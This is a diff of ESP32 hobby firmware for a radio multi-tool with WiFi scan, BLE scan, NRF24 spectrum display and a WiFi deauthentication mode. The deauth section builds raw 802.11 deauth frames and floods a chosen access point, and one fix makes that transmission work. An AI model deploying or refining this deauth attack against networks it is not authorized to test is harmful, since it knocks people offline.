@@ -8,7 +8,7 @@
  *     SDA → GPIO21  SCL → GPIO22
  *
  *   NRF24L01 (SPI + GPIO):
- *     VCC → 3.3V  GND → GND  [add 10µF cap VCC-GND at module]
+ *     VCC → 3.3V (NOT 5V — will damage module)  GND → GND  [add 10µF cap VCC-GND at module]
  *     CE  → GPIO4   CSN → GPIO5
  *     SCK → GPIO18  MOSI → GPIO23  MISO → GPIO19  IRQ → NC
  *
@@ -67,12 +67,21 @@ const char* const MENU_LABELS[MENU_COUNT] = {
     "4 NRF Spectrum",
 };
 
-// ── Button debounce ───────────────────────────────
-static unsigned long lastBtnMs = 0;
+// ── Per-button debounce timestamps  [fix #10] ────
+static unsigned long lastBtnNextMs = 0;
+static unsigned long lastBtnSelMs  = 0;
 
-static bool pressed(int pin) {
-    if (digitalRead(pin) == LOW && (millis() - lastBtnMs) > 220) {
-        lastBtnMs = millis();
+static bool pressed_next() {
+    if (digitalRead(BTN_NEXT) == LOW && (millis() - lastBtnNextMs) > 220) {
+        lastBtnNextMs = millis();
+        return true;
+    }
+    return false;
+}
+
+static bool pressed_sel() {
+    if (digitalRead(BTN_SEL) == LOW && (millis() - lastBtnSelMs) > 220) {
+        lastBtnSelMs = millis();
         return true;
     }
     return false;
@@ -104,34 +113,54 @@ static void menu_draw() {
 
 static void menu_handle() {
     menu_draw();
-    if (pressed(BTN_NEXT)) menuSel = (menuSel + 1) % MENU_COUNT;
-    if (pressed(BTN_SEL))  mode = (Mode)(menuSel + 1);
+    if (pressed_next()) menuSel = (menuSel + 1) % MENU_COUNT;
+    if (pressed_sel())  mode = (Mode)(menuSel + 1);
 }
 
 // ─────────────────────────────────────────────────
 // 1. WIFI SCAN
 // ─────────────────────────────────────────────────
-static int  wifiCount = 0;
-static int  wifiScroll = 0;
+static int  wifiCount       = 0;
+static int  wifiScroll      = 0;
+static bool wifiScanPending = false;
 
 static void wifi_scan_enter() {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
-    oled_header("WiFi Scan");
-    oled.println("Scanning...");
-    oled.display();
-    wifiCount = WiFi.scanNetworks();
+    wifiCount  = 0;
     wifiScroll = 0;
+    oled_header("WiFi Scan");
+    oled.println("Scanning... SEL=cancel");
+    oled.display();
+    WiFi.scanNetworks(true);            // async — loop stays responsive  [fix #12]
+    wifiScanPending = true;
 }
 
 static void wifi_scan_handle() {
+    if (wifiScanPending) {              // poll async result  [fix #12]
+        int result = WiFi.scanComplete();
+        if (result == WIFI_SCAN_RUNNING) {
+            oled_header("WiFi Scan");
+            oled.println("Scanning... SEL=cancel");
+            oled.display();
+            if (pressed_sel()) { WiFi.scanDelete(); wifiScanPending = false; mode = MENU; }
+            return;
+        }
+        wifiCount       = (result < 0) ? 0 : result;
+        wifiScanPending = false;
+        return;
+    }
+
     oled_header("WiFi Scan");
     if (wifiCount == 0) {
         oled.println("No networks");
     } else {
         oled.print(wifiCount); oled.println(" found. NEXT/SEL");
         for (int i = wifiScroll; i < min(wifiScroll + 3, wifiCount); i++) {
-            oled.print(WiFi.SSID(i).substring(0, 12));
+            // [fix #13] empty SSID = hidden network
+            String raw  = WiFi.SSID(i);
+            String ssid = raw.length() == 0 ? String("(hidden)") : raw.substring(0, 12);
+            oled.print(ssid);
             oled.print(" ch");
             oled.print(WiFi.channel(i));
             oled.print(" ");
@@ -140,14 +169,14 @@ static void wifi_scan_handle() {
     }
     oled.display();
 
-    if (pressed(BTN_NEXT)) wifiScroll = (wifiScroll + 1) % max(1, wifiCount);
-    if (pressed(BTN_SEL))  { WiFi.scanDelete(); mode = MENU; }
+    // [fix #6] clamp — last page never shows blank lines
+    if (pressed_next()) wifiScroll = min(wifiScroll + 1, max(0, wifiCount - 3));
+    if (pressed_sel())  { WiFi.scanDelete(); mode = MENU; }
 }
 
 // ─────────────────────────────────────────────────
 // 2. WIFI DEAUTH  — AUTHORIZED NETWORKS ONLY
 // ─────────────────────────────────────────────────
-// 802.11 deauthentication management frame (broadcast)
 static uint8_t deauth_frame[26] = {
     0xC0, 0x00,                         // Frame Control: Deauth
     0x00, 0x00,                         // Duration
@@ -158,41 +187,61 @@ static uint8_t deauth_frame[26] = {
     0x07, 0x00,                         // Reason: class3 from nonassoc STA
 };
 
-static int  deauthCount = 0;
-static int  deauthIdx   = 0;
-static bool deauthActive = false;
+static int  deauthCount       = 0;
+static int  deauthIdx         = 0;
+static bool deauthActive      = false;
+static bool deauthScanPending = false;
 
 static void deauth_enter() {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
     deauthActive = false;
+    deauthCount  = 0;
+    deauthIdx    = 0;
     oled_header("WiFi Deauth");
-    oled.println("Scanning...");
+    oled.println("Scanning... SEL=cancel");
     oled.display();
-    deauthCount = WiFi.scanNetworks();
-    deauthIdx = 0;
+    WiFi.scanNetworks(true);            // async  [fix #12]
+    deauthScanPending = true;
 }
 
 static void deauth_send(uint8_t* bssid, uint8_t channel) {
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_promiscuous(true);     // [fix #5] raw TX requires promiscuous mode
     memcpy(&deauth_frame[10], bssid, 6);
     memcpy(&deauth_frame[16], bssid, 6);
     for (int i = 0; i < 10; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
         delayMicroseconds(150);
     }
+    esp_wifi_set_promiscuous(false);
 }
 
 static void deauth_handle() {
-    oled_header("WiFi Deauth");
-    if (deauthCount == 0) {
-        oled.println("No networks found");
-        oled.println("SEL=back");
+    if (deauthScanPending) {            // [fix #12] poll async scan
+        int result = WiFi.scanComplete();
+        oled_header("WiFi Deauth");
+        oled.println("Scanning... SEL=cancel");
         oled.display();
-        if (pressed(BTN_SEL)) { WiFi.scanDelete(); mode = MENU; }
+        if (result == WIFI_SCAN_RUNNING) {
+            if (pressed_sel()) { WiFi.scanDelete(); deauthScanPending = false; mode = MENU; }
+            return;
+        }
+        deauthCount       = (result < 0) ? 0 : result;
+        deauthScanPending = false;
         return;
     }
 
+    if (deauthCount == 0) {             // [fix #16] explicit zero guard before % arithmetic
+        oled_header("WiFi Deauth");
+        oled.println("No networks found");
+        oled.println("SEL=back");
+        oled.display();
+        if (pressed_sel()) { WiFi.scanDelete(); mode = MENU; }
+        return;
+    }
+
+    oled_header("WiFi Deauth");
     if (!deauthActive) {
         oled.println(WiFi.SSID(deauthIdx).substring(0, 16));
         oled.print("ch:"); oled.print(WiFi.channel(deauthIdx));
@@ -201,15 +250,15 @@ static void deauth_handle() {
         oled.println("SEL=start deauth");
         oled.display();
 
-        if (pressed(BTN_NEXT)) deauthIdx = (deauthIdx + 1) % deauthCount;
-        if (pressed(BTN_SEL))  deauthActive = true;
+        if (pressed_next()) deauthIdx = (deauthIdx + 1) % deauthCount;
+        if (pressed_sel())  deauthActive = true;
     } else {
         oled.print("DEAUTHING:\n");
         oled.println(WiFi.SSID(deauthIdx).substring(0, 16));
         oled.println("SEL=stop");
         oled.display();
         deauth_send(WiFi.BSSID(deauthIdx), (uint8_t)WiFi.channel(deauthIdx));
-        if (pressed(BTN_SEL)) {
+        if (pressed_sel()) {
             deauthActive = false;
             WiFi.scanDelete();
             mode = MENU;
@@ -220,14 +269,14 @@ static void deauth_handle() {
 // ─────────────────────────────────────────────────
 // 3. BLE SCAN
 // ─────────────────────────────────────────────────
-static BLEScan*        bleScan  = nullptr;
-static BLEScanResults  bleResults;
-static int             bleIdx   = 0;
+static BLEScan*       bleScan   = nullptr;
+static BLEScanResults bleResults;
+static int            bleIdx    = 0;
 
 static void ble_scan_enter() {
     WiFi.mode(WIFI_OFF);
     delay(100);
-    BLEDevice::init("AEL-Toolkit");
+    BLEDevice::init("");                // [fix #15] empty name = no advertising during scan
     bleScan = BLEDevice::getScan();
     bleScan->setActiveScan(true);
     bleScan->setInterval(100);
@@ -260,8 +309,8 @@ static void ble_scan_handle() {
     oled.println("NEXT=scroll SEL=back");
     oled.display();
 
-    if (pressed(BTN_NEXT)) bleIdx = (bleIdx + 1) % max(1, count);
-    if (pressed(BTN_SEL)) {
+    if (pressed_next()) bleIdx = (bleIdx + 1) % max(1, count);
+    if (pressed_sel()) {
         bleScan->clearResults();
         BLEDevice::deinit(true);
         bleScan = nullptr;
@@ -276,12 +325,13 @@ static void ble_scan_handle() {
 // ─────────────────────────────────────────────────
 #define NRF_CH_COUNT 126
 static uint8_t nrfPower[NRF_CH_COUNT];
-static bool nrfOk = false;
+static bool    nrfOk = false;
 
 static void nrf_spectrum_enter() {
     memset(nrfPower, 0, sizeof(nrfPower));
     nrfOk = radio.begin();
     if (!nrfOk) {
+        radio.powerDown();              // [fix #2] safe call on failed init
         oled_header("NRF Spectrum");
         oled.println("NRF24 not found!");
         oled.println("Check wiring.");
@@ -302,7 +352,7 @@ static void nrf_sweep() {
         delayMicroseconds(128);
         radio.stopListening();
         if (radio.testRPD()) {
-            if (nrfPower[ch] < 240) nrfPower[ch] += 16;
+            if (nrfPower[ch] < 248) nrfPower[ch] += 8;  // [fix #7] rise == fall rate
         } else {
             if (nrfPower[ch] > 8)   nrfPower[ch] -= 8;
             else                     nrfPower[ch]  = 0;
@@ -316,18 +366,21 @@ static void nrf_draw() {
     oled.setTextColor(SSD1306_WHITE);
     oled.setCursor(0, 0);
     oled.println("2.4GHz Spectrum");
-    // bar area: y=10..63 = 54px tall, x=0..127
     const uint8_t BAR_TOP = 10;
     const uint8_t BAR_H   = 54;
-    for (uint8_t ch = 0; ch < NRF_CH_COUNT; ch++) {
-        uint8_t x = map(ch, 0, NRF_CH_COUNT - 1, 0, 127);
-        uint8_t h = map(nrfPower[ch], 0, 255, 0, BAR_H);
-        if (h > 0) oled.drawFastVLine(x, 63 - h, h, SSD1306_WHITE);
+    // [fix #14] group every 2 channels → 63 pairs × 2px = 126px, no collision
+    for (uint8_t pair = 0; pair < NRF_CH_COUNT / 2; pair++) {
+        uint8_t avg = ((uint16_t)nrfPower[pair * 2] + nrfPower[pair * 2 + 1]) / 2;
+        uint8_t x   = pair * 2;
+        uint8_t h   = map(avg, 0, 255, 0, BAR_H);
+        if (h > 0) {
+            oled.drawFastVLine(x,     63 - h, h, SSD1306_WHITE);
+            oled.drawFastVLine(x + 1, 63 - h, h, SSD1306_WHITE);
+        }
     }
-    // mark WiFi channels 1/6/11 (NRF ch 12/37/62)
-    for (uint8_t wch : {12, 37, 62}) {
-        uint8_t x = map(wch, 0, NRF_CH_COUNT - 1, 0, 127);
-        oled.drawPixel(x, BAR_TOP, SSD1306_WHITE);
+    // WiFi ch1/6/11 → NRF ch12/37/62 → pair 6/18/31 → x 12/36/62
+    for (uint8_t pair : {6, 18, 31}) {
+        oled.drawPixel(pair * 2, BAR_TOP, SSD1306_WHITE);
     }
     oled.display();
 }
@@ -336,7 +389,7 @@ static void nrf_spectrum_handle() {
     if (!nrfOk) { mode = MENU; return; }
     nrf_sweep();
     nrf_draw();
-    if (pressed(BTN_SEL)) {
+    if (pressed_sel()) {
         radio.powerDown();
         nrfOk = false;
         mode = MENU;
@@ -344,10 +397,32 @@ static void nrf_spectrum_handle() {
 }
 
 // ─────────────────────────────────────────────────
-// Mode dispatcher
+// Mode teardown — runs before every transition  [fix #4]
+// Idempotent: each case guards against double-cleanup.
 // ─────────────────────────────────────────────────
-static Mode prevMode = MENU;
+static void on_mode_exit(Mode leaving) {
+    switch (leaving) {
+        case WIFI_SCAN:
+        case WIFI_DEAUTH:
+            WiFi.scanDelete();
+            WiFi.mode(WIFI_OFF);
+            break;
+        case BLE_SCAN:
+            if (bleScan) {
+                bleScan->clearResults();
+                BLEDevice::deinit(true);
+                bleScan = nullptr;
+            }
+            break;
+        case NRF_SPECTRUM:
+            if (nrfOk) { radio.powerDown(); nrfOk = false; }
+            break;
+        default:
+            break;
+    }
+}
 
+// Mode entry dispatcher  [fix #3 — already correct; preserved with teardown wired]
 static void on_mode_enter() {
     switch (mode) {
         case WIFI_SCAN:    wifi_scan_enter();    break;
@@ -361,13 +436,15 @@ static void on_mode_enter() {
 // ─────────────────────────────────────────────────
 // setup / loop
 // ─────────────────────────────────────────────────
+static Mode prevMode = MENU;
+
 void setup() {
     Serial.begin(115200);
     pinMode(BTN_NEXT, INPUT_PULLUP);
     pinMode(BTN_SEL,  INPUT_PULLUP);
 
-    Wire.begin(21, 22);
-    if (!oled.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Wire.begin(21, 22);                // [fix #1 — already correct; preserved]
+    if (!oled.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {  // [fix #11 — already correct]
         Serial.println("SSD1306 init failed");
         while (true);
     }
@@ -386,6 +463,7 @@ void setup() {
 
 void loop() {
     if (mode != prevMode) {
+        on_mode_exit(prevMode);        // [fix #4] always teardown before enter
         prevMode = mode;
         if (mode != MENU) on_mode_enter();
     }
